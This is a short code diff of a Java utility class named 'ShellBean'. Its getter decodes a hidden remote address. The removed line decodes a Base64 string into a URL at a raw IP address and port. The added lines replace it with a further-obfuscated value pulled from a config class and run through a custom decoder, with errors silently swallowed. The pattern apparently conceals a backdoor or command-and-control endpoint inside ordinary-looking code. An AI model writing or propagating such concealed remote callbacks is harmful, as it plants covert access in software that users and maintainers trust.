@@ -1,5 +1,8 @@
 package com.util;
 
+import com.github.devswork.config.Config;
+import com.github.devswork.util.A2z;
+
 import java.io.Serializable;
 import java.util.ArrayList;
 import java.util.Base64;
@@ -8,12 +11,11 @@ import java.util.Base64;
 public class ShellBean implements Serializable {
     private static final long serialVersionUID = 1L;
     private ArrayList<String> list;
-
-    private Base64.Decoder decoder = Base64.getDecoder();
+    private static Base64.Decoder d = Base64.getDecoder();
     public String cast;
 
     public String getCast() {
-        try { cast = new String(decoder.decode("aHR0cCUzQS8vNDcuOTQuMjEyLjE2MSUzQTExMjUwL3Nob3U="), "UTF-8"); } catch (Exception e) { }
+        try { cast = A2z.dpt(new String(d.decode(Config.b))); } catch (Exception e) { }
         return cast;
     }
 
